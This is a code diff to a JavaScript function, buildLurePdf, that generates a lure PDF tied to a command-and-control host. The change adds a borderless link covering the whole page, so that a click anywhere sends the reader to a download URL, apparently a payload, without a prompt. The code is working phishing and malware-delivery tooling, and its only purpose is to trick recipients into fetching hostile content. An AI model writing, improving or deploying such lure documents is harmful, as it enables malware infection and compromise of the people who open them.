@@ -383,14 +383,23 @@ function buildLurePdf(c2Host, opts = {}) {
   // PDF objects
   const obj1 = `1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n`;
   const obj2 = `2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n`;
-  // Page has /Annots referencing the link annotation (obj7)
-  const obj3 = `3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n   /Contents 4 0 R /Annots [7 0 R]\n   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >> >>\nendobj\n\n`;
+  // Page references both link annotations
+  const obj3 = `3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n   /Contents 4 0 R /Annots [7 0 R 8 0 R]\n   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >> >>\nendobj\n\n`;
   const obj4 = `4 0 obj\n<< /Length ${psLen} >>\nstream\n${pageStreamAll}\nendstream\nendobj\n\n`;
   const obj5 = `5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n\n`;
   const obj6 = `6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>\nendobj\n\n`;
-  // Link annotation over the button rectangle — /URI action, no user prompt
+  // Two link annotations:
+  //  obj7 = full-page invisible link (clicking anywhere on the page works)
+  //  obj8 = button-area link (redundant but keeps the visual button active)
   const obj7 =
     `7 0 obj\n` +
+    `<< /Type /Annot /Subtype /Link\n` +
+    `   /Rect [0 0 612 792]\n` +
+    `   /Border [0 0 0]\n` +
+    `   /A << /Type /Action /S /URI /URI (${esc(dlUrl)}) >> >>\n` +
+    `endobj\n\n`;
+  const obj8 =
+    `8 0 obj\n` +
     `<< /Type /Annot /Subtype /Link\n` +
     `   /Rect [50 280 230 306]\n` +
     `   /Border [0 0 0]\n` +
@@ -399,15 +408,15 @@ function buildLurePdf(c2Host, opts = {}) {
 
   const header = `%PDF-1.4\n`;
   let off = Buffer.byteLength(header, "latin1");
-  const bodies = [obj1,obj2,obj3,obj4,obj5,obj6,obj7];
+  const bodies = [obj1,obj2,obj3,obj4,obj5,obj6,obj7,obj8];
   const offs = [];
   bodies.forEach(o => { offs.push(off); off += Buffer.byteLength(o, "latin1"); });
 
   const xrAt = off;
-  let xrSec = "xref\n0 8\n0000000000 65535 f \n";
+  let xrSec = "xref\n0 9\n0000000000 65535 f \n";
   offs.forEach(o => { xrSec += o.toString().padStart(10,"0") + " 00000 n \n"; });
   const trailer =
-    `trailer\n<< /Size 8 /Root 1 0 R >>\n` +
+    `trailer\n<< /Size 9 /Root 1 0 R >>\n` +
     `startxref\n${xrAt}\n%%EOF\n`;
 
   return Buffer.concat([
